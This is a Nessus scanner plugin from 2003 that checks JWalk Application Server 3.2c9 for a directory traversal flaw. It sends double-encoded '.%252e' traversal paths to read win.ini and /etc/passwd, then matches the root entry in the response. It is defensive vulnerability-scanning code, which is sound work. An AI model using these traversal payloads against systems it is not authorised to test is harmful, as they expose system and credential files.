#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# ref : 
# Subject: IRM 005: JWalk Application Server Version 3.2c9 Directory
#         Traversal Vulnerability
# From: IRM Advisories <advisories@irmplc.com>
# To: bugtraq@securityfocus.com
# Date: 25 Mar 2003 09:43:01 +0000
#

if(description)
{
 script_id(11467);
 script_bugtraq_id(7160);
 script_version ("$Revision: 1.5 $");
 
 name["english"] = "JWalk server traversal";
 name["francais"] = "JWalk server traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending .%252e/.%252e 
in front on the file name.

Solution : Upgrade to JWalk 3.3c4
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Reads a file outside the web root";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(! get_port_state(port)) exit(0);

i=0;
r[i] = "/.%252e/.%252e/.%252e/.%252e/windows/win.ini";	i=i+1;
r[i] = "/.%252e/.%252e/.%252e/.%252e/winnt/win.ini";	i=i+1;


for (i=0; r[i]; i=i+1)
{
  if (check_win_dir_trav_ka(port: port, url: r[i]))
  {
    security_hole(port);
    exit(0);
  }
}


req = http_get(item:"/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" , port:port);
rc = http_keepalive_send_recv(port:port, data:req);
if(rc == NULL ) exit(0);
if(egrep(pattern:"root:.*:0:[01]:", string:rc))
 {
  security_hole(port);
  exit(0);
 }
